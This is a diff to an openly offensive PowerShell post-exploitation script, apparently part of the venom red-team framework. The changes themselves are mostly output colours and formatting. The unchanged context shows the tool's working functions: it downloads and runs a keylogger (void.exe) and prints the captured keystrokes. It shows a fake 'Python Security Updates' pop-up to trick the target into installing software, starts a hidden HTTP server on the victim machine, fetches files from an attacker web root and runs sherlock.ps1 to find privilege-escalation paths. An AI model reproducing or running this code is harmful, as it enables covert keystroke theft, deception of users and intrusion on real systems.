@@ -205,7 +205,7 @@ If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'Fal
       into @webserver remote working directory [< -SPath >] parameter.
    #>
 
-   Write-Host "Downloading $FileName to $Initial_Path" -ForeGroundColor Green;Start-Sleep -Seconds 1
+   Write-Host "Downloading $FileName to $Initial_Path" -ForeGroundColor DarkGreen;Start-Sleep -Seconds 1
    If($ServerIP -Match '127.0.0.1'){## Localhost connections are not supported by this module
       Write-Host "[abort] 127.0.0.1 (localhost) connections are not supported." -ForeGroundColor Red -BackGroundColor Black
       Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
@@ -222,8 +222,8 @@ If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'Fal
    ## Make sure that file was successfuly downloaded
    If(-not([System.IO.File]::Exists("$Initial_Path\$FileName")) -or $FileName -ieq $Null){
       Write-Host "`nRemark : File to download must be stored in attacker apache2 webroot." -ForeGroundColor Yellow
-      Write-Host "syntax : .\webserver.ps1 -Download `"<Apache2-IP>,<FileName.ps1>`"" -ForeGroundColor Yellow 
-      Write-Host "example: .\webserver.ps1 -Download `"192.168.1.73,FileName.ps1`"" -ForeGroundColor Yellow
+      Write-Host "syntax : .\webserver.ps1 -Download `"<Apache2-IP>,<FileName.ps1>`""
+      Write-Host "example: .\webserver.ps1 -Download `"192.168.1.73,FileName.ps1`""
       Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver  
    }
 
@@ -281,7 +281,7 @@ If($SForce -ne '0' -or $SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -o
    #>
 
    ## Make sure python (@webserver) process is running on remote system
-   write-host "`nKill @webserver python process(s) in $SKill seconds." -ForeGroundColor DarkGreen
+   write-host "`nKill @webserver python process(s) in $SKill seconds."
    Start-Sleep -Seconds 1;Write-Host "`nId  Process  Version  Pid   StopTime"
    Write-Host "--  -------  -------  ---   --------" -ForeGroundColor DarkGreen
    $ProcessPythonRunning = Get-Process|Select-Object ProcessName|Select-String python
@@ -332,7 +332,7 @@ If($SForce -ne '0' -or $SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -o
    #>
 
    ## Create Data Table for Output
-   Write-Host "Active server sessions" -ForegroundColor DarkGreen
+   Write-Host "Active server sessions"
    Write-Host "`nId  Pid   StartTime  Bind          Port  Directory"
    Write-Host "--  ---   ---------  ----          ----  ---------" -ForeGroundColor DarkGreen
    If(Test-Path "$Env:TMP\sessions.log"){
@@ -352,7 +352,7 @@ If($SForce -ne '0' -or $SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -o
       If($CheckIfPidExist -Match "$Sessions"){
          cmd /c taskkill /F /PID $Sessions;Start-Sleep -Seconds 1
          Write-Host "`nCurrently active session process(s)" -ForegroundColor Yellow
-         Write-Host "ProcessName                   PID  SessionName                Session MemUsage" -ForegroundColor DarkGreen
+         Write-Host "ProcessName                   PID  SessionName                Session MemUsage"
          cmd /c tasklist /NH|findstr /I "python"
 
          ## Delete session PID Number from sessions.log file
@@ -405,7 +405,8 @@ If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'Fal
    ## Import-Module
    $SherlockPath = Test-Path -Path "$Env:TMP\sherlock.ps1" -EA SilentlyContinue
    If($SherlockPath -ieq "True" -and $SizeDump -gt 15){
-      Write-Host "Find missing software patchs for privilege escalation" -ForeGroundColor DarkGreen
+      Write-Host "CmdLet: sherlock.ps1 Author: @rasta-mouse" -ForeGroundColor DarkGreen
+      Write-Host "Find missing software patchs for privilege escalation"
       Import-Module $Env:TMP\sherlock.ps1
       Find-AllVulns
    }
@@ -515,7 +516,7 @@ $Timer = Get-Date -Format 'HH:mm:ss'
    #>
 
    If($Keylogger -ieq 'Start'){## Download binary from venom\GitHub (RAW)
-      write-host "Capture $Server_hostName keystrokes." -ForeGroundColor Green;Start-Sleep -Seconds 1
+      write-host "Capture $Server_hostName keystrokes." -ForeGroundColor DarkGreen;Start-Sleep -Seconds 1
       cmd /c curl.exe -L -k -s https://raw.githubusercontent.com/r00t-3xp10it/venom/master/bin/void.zip -o %tmp%\void.zip -u SSARedTeam:s3cr3t
 
       ## Check for Failed/Corrupted downloads
@@ -556,7 +557,10 @@ $Timer = Get-Date -Format 'HH:mm:ss'
             $mytable.Columns.Add("ProcessName")|Out-Null
             $mytable.Columns.Add("PID")|Out-Null
             $mytable.Columns.Add("LogFile")|Out-Null
-            $mytable.Rows.Add("$KeyLoggerTimer","void.exe","$PIDS","$Env:TMP\void.log")|Out-Null
+            $mytable.Rows.Add("$KeyLoggerTimer",
+                              "void.exe",
+                              "$PIDS",
+                              "$Env:TMP\void.log")|Out-Null
 
          ## Display Data Table
          $mytable|Format-Table -AutoSize > $Env:TMP\KeyDump.log
@@ -571,13 +575,13 @@ $Timer = Get-Date -Format 'HH:mm:ss'
       Write-Host "Captured keystrokes"
       Write-Host "-------------------" -ForegroundColor DarkGreen
       If(Test-Path -Path "$Env:TMP\void.log"){Get-Content -Path "$Env:TMP\void.log"};Write-Host ""
-      write-host "Stoping keylogger process (void.exe)" -ForeGroundColor Green;Start-Sleep -Seconds 1
+      write-host "Stoping keylogger process (void.exe)" -ForeGroundColor DarkGreen;Start-Sleep -Seconds 1
       $IDS = Get-Process void -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id|Select -Last 1
 
       If($IDS){## keylogger process found
          taskkill /F /IM void.exe|Out-Null
          If($? -ieq 'True'){## Check Last Command ErrorCode (LASTEXITCODE)
-            write-host "Keylogger PID $IDS process successfuly stoped.`n" -ForeGroundColor Green
+            write-host "Keylogger PID $IDS process successfuly stoped.`n"
          }Else{
             write-host "[fail] to terminate keylogger PID process" -ForeGroundColor Red -BackgroundColor Black
          }
@@ -616,9 +620,9 @@ If(-not($PythonVersion) -or $PythonVersion -ieq $null){
 
    If(cmd /c curl.exe --version){ # <-- Unnecessary step? curl its native (windows 10) rigth?
       ## Download python windows installer and use social engineering to trick user to install it
-      write-host "Downloading $BinName from python.org" -ForeGroundColor Green
+      write-host "Downloading $BinName from python.org" -ForeGroundColor Yellow
       cmd /c curl.exe -L -k -s https://www.python.org/ftp/python/3.9.0/$BinName -o %tmp%\$BinName -u SSARedTeam:s3cr3t
-      Write-Host "Remote Spawning Social Engineering MsgBox." -ForeGroundColor Green
+      Write-Host "Remote Spawning Social Engineering MsgBox."
       powershell (NeW-ObjeCt -ComObjEct Wscript.Shell).Popup("Python Security Updates Available.`nDo you wish to Install them now?",15,"$BinName setup",4+48)|Out-Null
       $HiddeMsgBox = $True
       If(Test-Path "$Env:TMP\$BinName"){
@@ -675,9 +679,9 @@ $Success = $False ## Python installation status
            $i++;Write-Host "[$i] Python Installation: not found." -ForeGroundColor Red -BackgroundColor Black
            ## Test if installler exists on remote directory
            If(Test-Path "$Env:TMP\$BinName"){
-              Write-Host "[$i] python windows installer: found." -ForeGroundColor Green;Start-Sleep -Seconds 1
+              Write-Host "[$i] python windows installer: found.";Start-Sleep -Seconds 1
               If($HiddeMsgBox -ieq $False){
-                  Write-Host "[$i] Remote Spawning Social Engineering MsgBox." -ForeGroundColor Green;Start-Sleep -Seconds 1
+                  Write-Host "[$i] Remote Spawning Social Engineering MsgBox.";Start-Sleep -Seconds 1
                   powershell (NeW-ObjeCt -ComObjEct Wscript.Shell).Popup("Python Security Updates Available.`nDo you wish to Install them now?",15,"$Server_hostName - $BinName setup",4+48)|Out-Null;
                   $HiddeMsgBox = $True
               }
@@ -693,7 +697,7 @@ $Success = $False ## Python installation status
         ## Python Successfull Installed ..
         # Mark $Success variable to $True to break SE loop
         }Else{
-           $i++;Write-Host "[$i] Python Installation: found." -ForeGroundColor Green
+           $i++;Write-Host "[$i] Python Installation: found."
            Start-Sleep -Seconds 2;$Success = $True
         }
    }
@@ -712,7 +716,7 @@ If(-not($Installation) -or $Installation -ieq $null){
 
 }Else{
 
-   write-host "All Python requirements are satisfied." -ForeGroundColor Green
+   write-host "All Python requirements are satisfied." -ForeGroundColor DarkGreen
    If(-not($SBind) -or $SBind -ieq $null){
       ## Grab remote target IPv4 ip address (to --bind)
       $Remote_Host = (Test-Connection -ComputerName (hostname) -Count 1 -ErrorAction SilentlyContinue).IPV4Address.IPAddressToString
@@ -769,7 +773,7 @@ If(-not($Installation) -or $Installation -ieq $null){
    #>
 
    Start-Process -WindowStyle hidden python -ArgumentList "-m http.server", "--directory $Server_Working_Dir", "--bind $Remote_Host", "$Remote_Server_Port" -ErrorAction SilentlyContinue|Out-Null
-   If($? -ieq $True){write-host "Serving HTTP on http://${Remote_Host}:${Remote_Server_Port}/ on directory '$Server_Working_Dir'" -ForeGroundColor Green
+   If($? -ieq $True){write-host "Serving HTTP on http://${Remote_Host}:${Remote_Server_Port}/ on directory '$Server_Working_Dir'" -ForeGroundColor DarkGreen
       $ServerTime = Get-Date -Format 'HH:mm:ss';write-host ""
       $PIDS = Get-Process python -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id|Select -Last 1
       echo "$PIDS  $ServerTime   $Remote_Host  $Remote_Server_Port  $Server_Working_Dir" >> $Env:TMP\sessions.log
